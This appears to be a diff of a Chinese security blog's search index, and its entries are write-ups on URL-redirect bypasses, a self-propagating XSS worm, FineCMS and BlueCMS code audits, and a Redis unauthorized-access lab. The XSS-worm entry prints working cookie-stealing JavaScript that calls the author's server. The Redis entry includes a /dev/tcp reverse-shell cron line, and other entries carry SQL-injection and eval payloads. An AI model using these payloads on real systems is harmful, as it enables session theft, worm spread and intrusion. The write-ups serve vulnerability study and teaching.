@@ -1,6 +1,17 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Url Redirect]]></title>
+    <url>%2F2019%2F03%2F31%2FURLRedirect%2F</url>
+    <content type="text"><![CDATA[URL重定向/跳转漏洞在漏洞挖掘中算是比较容易发现的一种，这里简单介绍下其原理，着重说一些发现过程和绕过方式### 成因 常见方式 META标签的refresh Javascript header meta 1&lt;meta http-equiv="refresh" content="0; url=url"&gt; Javascript 1location.href="url"; header 123&lt;?php header("Location:url");?&gt; 当上述栗子中的url未限制时就产生了URL重定向/跳转漏洞 发现 在退出处常见URL跳转 利用burp的search，搜索=http 同时返回包为302的内容 发包到repeater,略作修改 绕过一般来说URL跳转发现比较容易，但是利用起来比较难，因为许多会做一些防护 1.xip.io绕过 这里只要不是www就会强制返回到https://xue.xx.com/login 但是利用https://xue.xx.com.*.xip.io 2.使用@绕过 这里并不能采用xip.io的方式绕过 可以使用@但是如果@后的域名不在规定范围内同样不可跳转 这个时候可以在@前加上/，\或者?尝试下 3.http://后加反斜杠绕过 有些时候@和.xip.io都不能使 这个时候可以采用http://\的样式尝试绕过 4.某些加密 http://xx.xx.cn/?src=l4uLj8XQ0IiIiNGHlpOK0ZyQktCFl4qekYuWoM7IycfIztGXi5KT 这个链接会跳转到http://www.xilu.com/zhuanti_176871.html 将 l4uLj8XQ0IiIiNGHlpOK0ZyQktCFl4qekYuWoM7IycfIztGXi5KT base64解密 1\x97\x8b\x8b\x8f\xc5\xd0\xd0\x88\x88\x88\xd1\x87\x96\x93\x8a\xd1\x9c\x90\x92\xd0\x85\x97\x8a\x9e\x91\x8b\x96\xa0\xce\xc8\xc9\xc7\xc8\xce\xd1\x97\x8b\x92\x93 推测与跳转的链接一一对应，推测出对应关系表 123&#123;&apos;a&apos;:&apos;9e&apos;, &apos;b&apos;:&apos;9d&apos;, &apos;c&apos;:&apos;9c&apos;, &apos;d&apos;:&apos;9b&apos;, &apos;e&apos;:&apos;9a&apos;,&apos;f&apos;:&apos;99&apos;, &apos;g&apos;:&apos;98&apos;, &apos;h&apos;:&apos;97&apos;, &apos;i&apos;:&apos;96&apos;, &apos;j&apos;:&apos;95&apos;, &apos;k&apos;:&apos;94&apos;, &apos;l&apos;:&apos;93&apos;, &apos;m&apos;:&apos;92&apos;, &apos;n&apos;:&apos;91&apos;, &apos;o&apos;:&apos;90&apos;,&apos;p&apos;:&apos;8f&apos;, &apos;q&apos;:&apos;8e&apos;, &apos;r&apos;:&apos;8d&apos;, &apos;s&apos;:&apos;8c&apos;, &apos;t&apos;:&apos;8b&apos;, &apos;u&apos;:&apos;8a&apos;, &apos;v&apos;:&apos;89&apos;, &apos;w&apos;:&apos;88&apos;, &apos;x&apos;:&apos;87&apos;, &apos;y&apos;:&apos;86&apos;,&apos;z&apos;:&apos;85&apos;,&apos;.&apos;:&apos;d1&apos;,&apos;/&apos;:&apos;d0&apos;,&apos;:&apos;:&apos;c5&apos;&#125; 我寻了半生的春天，你一笑便是了。]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[XSSWORM]]></title>
     <url>%2F2019%2F03%2F31%2Fxssworm%2F</url>
     <content type="text"><![CDATA[一个不错的XSSWORM需要许多知识，总的来说还是很有趣的 利用条件 可以利用的XSS 例如个人档案，留言处，发表的文章，发表的动态之类的 可控点 XSS存在处的CSRF 所需知识 XSS Ajax 隐蔽的发送请求 同源策略 http://noel.xin/2019/02/15/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#more 实现步骤 发现可利用的XSS，以留言处为例 发表留言处存在CSRF 发表带有XSS的留言，XSS的作用是发布留言同时可以做一些其他事，例如获取Cookie 用户被感染，留言传播 实例分析以某游记系统为例具体分析一下 发表游记的参数中有一个直接输出，得到一枚储存型XSS 想要构成worm,我们需要让其他看了这篇游记的人也发表一篇带有恶意代码的游记 回到发表游记处，这里存在一个CSRF 123&#123;"id":"******","userId":"*****","userName":"******","AssociateEntityList":[&#123;"brandId":134,"brandName":"ABT","seriesId":2366,"seriesName":"ABT A3"&#125;] ............ 不过这里有一点儿问题 这里有id,userID,以及userName 后面经过测试发现发表游记的时候id和userName都可以为空，那么问题来了，userId怎么获得呢？ 别忘了我们已经有一个储存型XSS了 发现Cookie里有一个 1userid=97***548 通过XSS将Cookie发送到自己的服务器上，同时对Cookie进行处理，得到userId,并进行CSRF操作 可能有些同学这时候就有疑问了，为什么不直接用JavaScript处理呢？ 原因是发表游记时值是Json的形式，使用JS很容易出错，如果使用转义符的话最后输出的时候转义符也会在，最后迫不得已选择了上述操作 我们可以构造储存型XSS啦！ 123456&lt;script&gt; var o=document.body; var a=document.createElement("iframe");a.src="http://noel.xin/cookie.php?Cookie="+document.cookie; a.style.opacity=0; o.appendChild(a);&lt;/script&gt; 利用得到的userID发表游记 index.php 12345678910111213&lt;?php$Cookie = @$_GET[&apos;Cookie&apos;]?$_GET[&apos;Cookie&apos;]:&apos;&apos;;$start = strpos($Cookie,&quot;userid&quot;)+10;$id = substr($Cookie,$start,8);?&gt;&lt;script&gt; var req = new XMLHttpRequest(); var data = &quot;jsonData=&#123;&apos;id&apos;:0,&apos;userId&apos;:&lt;?=$id?&gt;,&apos;userName&apos;:&apos;&apos;,&apos;XSS&apos;:&apos;上述代码&apos;&#125;&quot;; req.open(&apos;post&apos;,&apos;https://target.com&apos;,true); req.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded;&quot;); req.withCredentials = true; req.send(data);&lt;/script&gt; 完成！ 之后只要别人看了我发的游记后都会发一篇带有恶意代码的XSS，当然，为了爱和正义，文章立刻给删了。 也许不能喜欢你到天边的花火都枯萎，但真的梦想过与你，并肩去看一场烟火]]></content>
@@ -10,17 +21,6 @@
       <tags>
         <tag>Web</tag>
         <tag>XSS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Url Redirect]]></title>
-    <url>%2F2019%2F03%2F31%2FURLRedirect%2F</url>
-    <content type="text"><![CDATA[URL重定向/跳转漏洞在漏洞挖掘中算是比较容易发现的一种，这里简单介绍下其原理，着重说一些发现过程和绕过方式### 成因 常见方式 META标签的refresh Javascript header meta 1&lt;meta http-equiv="refresh" content="0; url=url"&gt; Javascript 1location.href="url"; header 123&lt;?php header("Location:url");?&gt; 当上述栗子中的url未限制时就产生了URL重定向/跳转漏洞 发现 在退出处常见URL跳转 利用burp的search，搜索=http 同时返回包为302的内容 发包到repeater,略作修改 绕过一般来说URL跳转发现比较容易，但是利用起来比较难，因为许多会做一些防护 1.xip.io绕过 这里只要不是www就会强制返回到https://xue.xx.com/login 但是利用https://xue.xx.com.*.xip.io 2.使用@绕过 这里并不能采用xip.io的方式绕过 可以使用@但是如果@后的域名不在规定范围内同样不可跳转 这个时候可以在@前加上/，\或者?尝试下 3.http://后加反斜杠绕过 有些时候@和.xip.io都不能使 这个时候可以采用http://\的样式尝试绕过 4.某些加密 http://xx.xx.cn/?src=l4uLj8XQ0IiIiNGHlpOK0ZyQktCFl4qekYuWoM7IycfIztGXi5KT 这个链接会跳转到http://www.xilu.com/zhuanti_176871.html 将 l4uLj8XQ0IiIiNGHlpOK0ZyQktCFl4qekYuWoM7IycfIztGXi5KT base64解密 1\x97\x8b\x8b\x8f\xc5\xd0\xd0\x88\x88\x88\xd1\x87\x96\x93\x8a\xd1\x9c\x90\x92\xd0\x85\x97\x8a\x9e\x91\x8b\x96\xa0\xce\xc8\xc9\xc7\xc8\xce\xd1\x97\x8b\x92\x93 推测与跳转的链接一一对应，推测出对应关系表 123&#123;&apos;a&apos;:&apos;9e&apos;, &apos;b&apos;:&apos;9d&apos;, &apos;c&apos;:&apos;9c&apos;, &apos;d&apos;:&apos;9b&apos;, &apos;e&apos;:&apos;9a&apos;,&apos;f&apos;:&apos;99&apos;, &apos;g&apos;:&apos;98&apos;, &apos;h&apos;:&apos;97&apos;, &apos;i&apos;:&apos;96&apos;, &apos;j&apos;:&apos;95&apos;, &apos;k&apos;:&apos;94&apos;, &apos;l&apos;:&apos;93&apos;, &apos;m&apos;:&apos;92&apos;, &apos;n&apos;:&apos;91&apos;, &apos;o&apos;:&apos;90&apos;,&apos;p&apos;:&apos;8f&apos;, &apos;q&apos;:&apos;8e&apos;, &apos;r&apos;:&apos;8d&apos;, &apos;s&apos;:&apos;8c&apos;, &apos;t&apos;:&apos;8b&apos;, &apos;u&apos;:&apos;8a&apos;, &apos;v&apos;:&apos;89&apos;, &apos;w&apos;:&apos;88&apos;, &apos;x&apos;:&apos;87&apos;, &apos;y&apos;:&apos;86&apos;,&apos;z&apos;:&apos;85&apos;,&apos;.&apos;:&apos;d1&apos;,&apos;/&apos;:&apos;d0&apos;,&apos;:&apos;:&apos;c5&apos;&#125; 我寻了半生的春天，你一笑便是了。]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
@@ -139,6 +139,17 @@
       <tags>
         <tag>Web</tag>
         <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[CNVD漏洞检测]]></title>
+    <url>%2F2019%2F01%2F25%2FCNVD%2F</url>
+    <content type="text"><![CDATA[使用Python获取CNVD漏洞信息，与Redis相结合，用于储存信息，每次运行检测是否有新的漏洞产生，有的话进行提醒 4/1简单的将Python与Redis进行结合做出来的第一个版本12345678910111213141516171819202122232425262728# -*- coding: utf-8 -*-#!/usr/bin/env python3import requestsimport redisimport re#constantHOST = 'localhost'PORT = 6379PWD = ''URL = "http://www.cnvd.org.cn/flaw/list.htm?flag=true"headers = &#123; 'User-Agent':' Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0'&#125;Data = &#123;'max':20,'offset':0&#125;R = redis.Redis(host=HOST,port=PORT,password=PWD)res = requests.post(URL,data=Data,headers=headers)text = bytes.decode(res.content)infos = re.findall('&lt;/img&gt; &lt;a\s.+href="/flaw/show/(.*?)"?\s+title="(.*?)"&gt;',text)for i in infos: info = i[0]+','+i[1] if R.sadd('CNVD',info): print('[*]New Info:',info) PS:使用集合可能不是那么明智的选择 海底月是天上月，眼前人是心上人。向来心是看客心，奈何人是剧中人。]]></content>
+      <categories>
+        <category>开发</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
@@ -270,18 +281,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[finecms免费版漏洞分析]]></title>
-    <url>%2F2018%2F10%2F03%2Ffinecms%E5%85%8D%E8%B4%B9%E7%89%88%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
-    <content type="text"><![CDATA[FineCMS是一款基于PHP+MySql+CI框架开发的高效简洁的中小型内容管理系统 0x00 开始前的准备网上存在许多5.0.X的漏洞分析，本来想找个5.0.x版本的进行分析，结果最后只找到了一个免费版 0x01 寻找漏洞在\extensions\下的function.php文件下有一个函数 其中的 1@eval("\$array = $data;"); 很明显存在漏洞，先测试下 Payload:?a=array();phpinfo() 0x02 漏洞利用回到CMS中，找一下哪里用了这个函数，在function.php文件里发现了一个fn_authcode函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/** * authcode函数(用于数组) */function fn_authcode($data, $operation = 'DECODE', $key = '', $expiry = 0) &#123; $ckey_length = 4; $string = $operation == 'DECODE' ? $data : array2string($data); $key = md5($key ? $key : SITE_MEMBER_COOKIE); $keya = md5(substr($key, 0, 16)); $keyb = md5(substr($key, 16, 16)); $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : ''; $cryptkey = $keya . md5($keya . $keyc); $key_length = strlen($cryptkey); $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string; $string_length = strlen($string); $result = ''; $box = range(0, 255); $rndkey = array(); for($i = 0; $i &lt;= 255; $i++) &#123; $rndkey[$i] = ord($cryptkey[$i % $key_length]); &#125; for($j = $i = 0; $i &lt; 256; $i++) &#123; $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; &#125; for($a = $j = $i = 0; $i &lt; $string_length; $i++) &#123; $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256])); &#125; if($operation == 'DECODE') &#123; if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) &#123; return string2array(substr($result, 26)); &#125; else &#123; return ''; &#125; &#125; else &#123; return $keyc . str_replace('=', '', base64_encode($result)); &#125;&#125; 发现这个函数在ApiController.php文件中被调用 1$data = fn_authcode(base64_decode($this-&gt;get('file')), 'DECODE'); 这里的file可控，现在只要构造合适的file就可以达成命令执行了,回到fn_authocode函数，这是一个只和SITE_MEMBER_COOKIE有关的函数，而SITE_MEMBER_COOKIE又是一个默认的值，只要将fn_authcode的参数改一下就可以构造成我们要的payload 尝试下 1http://localhost/finecms/?c=api&amp;a=down&amp;file=ZmZlMXhvY3N4ZWluZnpuSEoyUGRBRkhPZ01rcGRQbFdLZ1RJT3pSaG0rR21ab1JyRS96c1dnMnFJT1dTMUVn 0x03 总结这一次漏洞分析还是异常吃力，漏洞函数很容易就发现了，但是漏洞利用的地方找了半天，除此之外就是fn_authocode函数的加解密，长见识了，对网站的整体结构了解还是不够，继续努力。]]></content>
-      <categories>
-        <category>代码审计</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>PHP</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[BlueCMS 代码审计]]></title>
     <url>%2F2018%2F10%2F03%2FBlueCMS-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
     <content type="text"><![CDATA[blueCMS是一款小众的CMS ,网上也有很多漏洞分析之类的文章，用来做代码审计入门练习还是不错的选择 0x00 环境准备 Apache + PHP BlueCMS v1.6 sp1 Mysql监控 0x01大体结构分析入口文件与common函数大致看了下index文件，果然入口文件很难发现漏洞，继续看两个common文件 因为是GBK编码的CMS所以此处可以被宽字节注入，此外就是IP未过滤 0x02 漏洞点测试IP首先测试下IP，全局搜索getip,在comment发现getip并且未做处理就放入SQL中执行 进入comment页面，不知道为什么没有内容显示，只好换个方向，在common.inc文件中$online_ip是由getip得到的 搜索$online_ip后在guest_book文件中发现 测试下功能，确认可用 构造payload X-Forwarded-For:’,database())# 可以在留言中看到数据库名已经出现了 数值型注入在ad_js.php文件中可以发现，$ad_id变量受我们控制，而且插入SQL语句时没用单引号，这就使我们可以直接注入了 union select得到数据库名称 xss漏洞在user.php文件的增加新闻处 content并没有用htmlspecialchars函数过滤，而是采用了filter_data函数 只要关键字大写就可以绕过 创建一个用户后发表一个新闻，content内容为XSS PAYLOAD 切换账号访问新闻页 0x03 总结第一次代码审计一个CMS，果然我还是太菜了，只能发现最基础的一些漏洞，不过慢慢来啦，急不来。]]></content>
@@ -294,15 +293,15 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[redis未授权访问]]></title>
-    <url>%2F2018%2F10%2F02%2F%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%2F</url>
-    <content type="text"><![CDATA[安全工程师”墨者”在单位办公内网做日常检测时，发现某部门为了方便运维人员做远程调试，将Redis默认端口6379通过防火墙映射在公网，并且没有做验证措施。 0x00 目标和方向目标 了解Redis应用的相关服务 了解Redis基本命令的使用 了解Redis在低权限下的渗透思路 方向远程连接Redis服务，进行漏洞利用，获取KEY。 0x01 写入ssh公钥原理：用kali生成公钥，并写入REDIS中，之后保存到/root/.ssh/下的authorized.keys 中 先连接上Redis redis-cli -h 219.153.49.228 -p 40211 结果在设置Redis的保存路径时就出现了错误 换种方法试试 0x02 定时任务反弹Shell上一个尝试以没有权限失败告终，这次尝试估计也是没有权限，但姑且还是尝试了下 把Redis保存文件设置为/var/spool/cron/root 写入反弹shell的命令： 1set xxx "\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/YOURIP/PORT 0&gt;&amp;1\n\n" 果然Save的时候出现错误 0x03 在Web目录下写入WebShell靶机给出的端口中另一个是Web端口，尝试着写入WebShell吧 先写一个PHP文件测试下 访问http://219.153.49.228:44328/test.php,确实写进去东西了 接下来就是写一句话，菜刀连接，拿到KEY]]></content>
+    <title><![CDATA[finecms免费版漏洞分析]]></title>
+    <url>%2F2018%2F10%2F03%2Ffinecms%E5%85%8D%E8%B4%B9%E7%89%88%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
+    <content type="text"><![CDATA[FineCMS是一款基于PHP+MySql+CI框架开发的高效简洁的中小型内容管理系统 0x00 开始前的准备网上存在许多5.0.X的漏洞分析，本来想找个5.0.x版本的进行分析，结果最后只找到了一个免费版 0x01 寻找漏洞在\extensions\下的function.php文件下有一个函数 其中的 1@eval("\$array = $data;"); 很明显存在漏洞，先测试下 Payload:?a=array();phpinfo() 0x02 漏洞利用回到CMS中，找一下哪里用了这个函数，在function.php文件里发现了一个fn_authcode函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/** * authcode函数(用于数组) */function fn_authcode($data, $operation = 'DECODE', $key = '', $expiry = 0) &#123; $ckey_length = 4; $string = $operation == 'DECODE' ? $data : array2string($data); $key = md5($key ? $key : SITE_MEMBER_COOKIE); $keya = md5(substr($key, 0, 16)); $keyb = md5(substr($key, 16, 16)); $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : ''; $cryptkey = $keya . md5($keya . $keyc); $key_length = strlen($cryptkey); $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string; $string_length = strlen($string); $result = ''; $box = range(0, 255); $rndkey = array(); for($i = 0; $i &lt;= 255; $i++) &#123; $rndkey[$i] = ord($cryptkey[$i % $key_length]); &#125; for($j = $i = 0; $i &lt; 256; $i++) &#123; $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; &#125; for($a = $j = $i = 0; $i &lt; $string_length; $i++) &#123; $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256])); &#125; if($operation == 'DECODE') &#123; if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) &#123; return string2array(substr($result, 26)); &#125; else &#123; return ''; &#125; &#125; else &#123; return $keyc . str_replace('=', '', base64_encode($result)); &#125;&#125; 发现这个函数在ApiController.php文件中被调用 1$data = fn_authcode(base64_decode($this-&gt;get('file')), 'DECODE'); 这里的file可控，现在只要构造合适的file就可以达成命令执行了,回到fn_authocode函数，这是一个只和SITE_MEMBER_COOKIE有关的函数，而SITE_MEMBER_COOKIE又是一个默认的值，只要将fn_authcode的参数改一下就可以构造成我们要的payload 尝试下 1http://localhost/finecms/?c=api&amp;a=down&amp;file=ZmZlMXhvY3N4ZWluZnpuSEoyUGRBRkhPZ01rcGRQbFdLZ1RJT3pSaG0rR21ab1JyRS96c1dnMnFJT1dTMUVn 0x03 总结这一次漏洞分析还是异常吃力，漏洞函数很容易就发现了，但是漏洞利用的地方找了半天，除此之外就是fn_authocode函数的加解密，长见识了，对网站的整体结构了解还是不够，继续努力。]]></content>
       <categories>
-        <category>渗透</category>
+        <category>代码审计</category>
       </categories>
       <tags>
         <tag>Web</tag>
-        <tag>redis</tag>
+        <tag>PHP</tag>
       </tags>
   </entry>
   <entry>
@@ -315,6 +314,18 @@
       <tags>
         <tag>Web</tag>
         <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[redis未授权访问]]></title>
+    <url>%2F2018%2F10%2F02%2F%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%2F</url>
+    <content type="text"><![CDATA[安全工程师”墨者”在单位办公内网做日常检测时，发现某部门为了方便运维人员做远程调试，将Redis默认端口6379通过防火墙映射在公网，并且没有做验证措施。 0x00 目标和方向目标 了解Redis应用的相关服务 了解Redis基本命令的使用 了解Redis在低权限下的渗透思路 方向远程连接Redis服务，进行漏洞利用，获取KEY。 0x01 写入ssh公钥原理：用kali生成公钥，并写入REDIS中，之后保存到/root/.ssh/下的authorized.keys 中 先连接上Redis redis-cli -h 219.153.49.228 -p 40211 结果在设置Redis的保存路径时就出现了错误 换种方法试试 0x02 定时任务反弹Shell上一个尝试以没有权限失败告终，这次尝试估计也是没有权限，但姑且还是尝试了下 把Redis保存文件设置为/var/spool/cron/root 写入反弹shell的命令： 1set xxx "\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/YOURIP/PORT 0&gt;&amp;1\n\n" 果然Save的时候出现错误 0x03 在Web目录下写入WebShell靶机给出的端口中另一个是Web端口，尝试着写入WebShell吧 先写一个PHP文件测试下 访问http://219.153.49.228:44328/test.php,确实写进去东西了 接下来就是写一句话，菜刀连接，拿到KEY]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>redis</tag>
       </tags>
   </entry>
   <entry>
